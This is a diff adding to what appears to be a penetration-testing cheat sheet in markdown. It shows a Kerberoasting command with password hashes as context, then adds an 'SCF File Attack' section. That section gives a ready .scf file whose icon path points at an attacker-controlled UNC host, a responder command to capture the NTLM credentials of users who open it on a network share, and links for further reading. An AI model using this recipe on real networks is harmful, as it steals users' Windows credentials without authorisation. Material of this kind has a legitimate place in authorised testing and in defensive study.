@@ -42,3 +42,28 @@ python3 GetUserSPNs.py -request -dc-ip <IP> -hashes <LM_HASH>:<NT_HASH> <DOMAIN>
 - [Cracking Kerberos TGS Tickets Using Kerberoast](https://adsecurity.org/?p=2293)
 - [Dectecting Kerboasting Activity](https://adsecurity.org/?p=3458)
 - [Kerberos Overview](https://adsecurity.org/?p=227)
+
+**SCF File Attack**
+
+An SCF *(Shell Command File)* can be used to access an attacker's UNC path. Planted inside a nwtwork share, when a user opens the ``scf`` file, Windows automatically authenicates to the server the UNC is pointing to, using the current user's credentials. We can use ``responder`` or somthing similar to harvest these credentials and crack them offline.
+
+1) Inside a ``.scf`` file put:
+
+```
+[Shell]
+Command=2
+IconFile=\\<YOUR IP>\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+2) Run [responder](https://github.com/lgandx/Responder) locally
+
+```bash
+responder -I <NETWORK INTERFACE>
+```
+
+3) Put your ``.scf`` file on a share and wait for a user to open it.
+
+- [SMB Share – SCF File Attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
+- [Stealing Windows Credentials Using Google Chrome](https://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)
